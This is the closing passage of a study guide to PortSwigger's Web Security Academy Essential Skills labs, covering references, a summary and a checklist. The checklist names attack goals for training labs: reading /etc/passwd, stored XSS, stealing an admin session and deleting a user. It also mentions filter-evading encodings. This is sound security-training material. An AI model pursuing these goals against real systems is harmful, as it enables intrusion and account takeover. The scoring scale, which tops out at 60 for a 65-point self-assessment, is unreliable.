5. **Contribute to Security Community** - Write blogs, give talks
6. **Pursue Certifications** - BSCP, OSWE, OSCP

**Lifelong Learning:**
- Security is constantly evolving
- Essential Skills (methodology, efficiency, tool mastery) remain relevant
- Specific vulnerabilities change, but principles persist

---

## References and Resources {#references}

### Official PortSwigger Resources

**Essential Skills Documentation:**
- [Essential skills for web application security testing](https://portswigger.net/web-security/essential-skills)
- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [Using Burp Scanner during manual testing](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing)

**Labs:**
- [Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)
- [Lab: Scanning non-standard data structures](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)
- [Mystery lab challenge](https://portswigger.net/web-security/mystery-lab-challenge)

**Supporting Documentation:**
- [All labs](https://portswigger.net/web-security/all-labs)
- [Learning paths](https://portswigger.net/web-security/learning-paths)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

### Related Vulnerability References (In This Skill)

- [XXE Injection Labs](./xxe-portswigger-labs-complete.md)
- [XXE Cheat Sheet](./xxe-cheat-sheet.md)
- [XSS Labs](./xss-portswigger-labs-complete.md)
- [XSS Quickstart](./xss-quickstart.md)
- [SQL Injection Labs](./sql-injection.md)
- [Path Traversal Labs](./path-traversal-portswigger-labs-complete.md)
- [OS Command Injection Labs](./os-command-injection-portswigger-labs-complete.md)

### OWASP Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### Certifications

**Burp Suite Certified Practitioner (BSCP):**
- Official certification from PortSwigger
- Requires Mystery Lab proficiency
- Essential Skills mastery is core requirement
- [Certification Info](https://portswigger.net/web-security/certification)

### Community and Practice

**PortSwigger Community:**
- [User Forums](https://forum.portswigger.net/)
- [Research Blog](https://portswigger.net/research)
- [Daily Swig (News)](https://portswigger.net/daily-swig)

**Practice Platforms:**
- PortSwigger Web Security Academy (free)
- HackTheBox (web challenges)
- TryHackMe (guided learning)
- PentesterLab (progressive exercises)

### Books

- *The Web Application Hacker's Handbook* by Dafydd Stuttard & Marcus Pinto
- *Real-World Bug Hunting* by Peter Yaworski
- *Web Security Testing Cookbook* by Paco Hope & Ben Walther

### Tools

**Burp Suite:**
- [Download](https://portswigger.net/burp/releases)
- [Documentation](https://portswigger.net/burp/documentation)
- [Extensions (BApp Store)](https://portswigger.net/bappstore)

**Alternative Tools:**
- OWASP ZAP (free, open-source)
- Caido (modern alternative)
- mitmproxy (Python-based proxy)

---

## Summary

### Key Takeaways

**1. Essential Skills = Methodology + Efficiency**
- Not just about finding vulnerabilities
- About finding them QUICKLY and THOROUGHLY
- Combines human intuition with automated testing

**2. Two Core Techniques:**
- **Targeted Scanning:** Scan specific requests, not entire applications
- **Scan Selected Insertion Point:** Test non-standard data structures

**3. Three Core Topics:**
- **Burp Scanner Integration:** Human + machine efficiency
- **Encoding Bypasses:** Evade filters and WAFs
- **Mystery Labs:** Practice unknown vulnerability identification

**4. Real-World Impact:**
- 3-6x faster vulnerability discovery
- Higher-severity findings
- Career advancement and higher earnings
- Essential for bug bounty success

**5. Continuous Practice:**
- Mystery Labs weekly
- Apply to real-world testing
- Stay updated with PortSwigger research
- Pursue BSCP certification

### Next Steps

1. **Complete Lab 1:** Practice time-constrained targeted scanning
2. **Complete Lab 2:** Master non-standard data structure testing
3. **Practice Mystery Labs:** Build reconnaissance skills
4. **Review Encoding Techniques:** Study bypass methods
5. **Apply to Other Labs:** Use Essential Skills in all vulnerability categories
6. **Real-World Testing:** Apply to bug bounties or professional engagements
7. **Pursue Certification:** BSCP certification demonstrates mastery

---

**Document Version:** 1.0
**Last Updated:** 2026-01-10
**Lab Count:** 2
**Status:** Complete based on current PortSwigger Web Security Academy content

**Note:** PortSwigger plans to expand the Essential Skills section. This document will be updated as new labs and topics are released.

---

## Appendix: Quick Reference

### Lab Completion Checklist

- [ ] Lab 1: Discovering vulnerabilities quickly with targeted scanning
  - [ ] Complete in under 10 minutes
  - [ ] Use Burp Scanner effectively
  - [ ] Retrieve `/etc/passwd`
- [ ] Lab 2: Scanning non-standard data structures
  - [ ] Identify colon-separated cookie format
  - [ ] Use "Scan selected insertion point"
  - [ ] Exploit stored XSS
  - [ ] Steal admin session via Burp Collaborator
  - [ ] Delete user "carlos"
- [ ] Complete 5 Practitioner Mystery Labs (BSCP prep)
- [ ] Review all encoding techniques
- [ ] Practice targeted scanning on other labs

### Time Targets

| Lab | Beginner | Intermediate | Expert |
|-----|----------|--------------|--------|
| Lab 1 | 15-20 min | 10-12 min | 5-7 min |
| Lab 2 | 25-30 min | 15-20 min | 10-12 min |
| Mystery Lab | 90 min | 60 min | 30-45 min |

### Essential Skills Mastery Self-Assessment

Rate yourself (1-5) on each skill:

- [ ] Rapid application reconnaissance
- [ ] Identifying high-value attack targets
- [ ] Using Burp Scanner targeted scanning
- [ ] Scan selected insertion point technique
- [ ] Interpreting scanner findings
- [ ] Manual verification of scanner results
- [ ] URL encoding bypass techniques
- [ ] HTML entity encoding for XSS
- [ ] XML entity encoding for SQLi
- [ ] Multiple encoding layer exploitation
- [ ] Non-standard data structure identification
- [ ] Mystery Lab completion (5 Practitioner labs)
- [ ] Time-constrained testing efficiency

**Scoring:**
- 55-60: Expert - Ready for BSCP
- 45-54: Advanced - Practice mystery labs
- 35-44: Intermediate - Complete more Practitioner labs
- 25-34: Beginner - Review documentation and practice
- Below 25: Start with Apprentice labs

---

**End of Essential Skills Complete Guide**
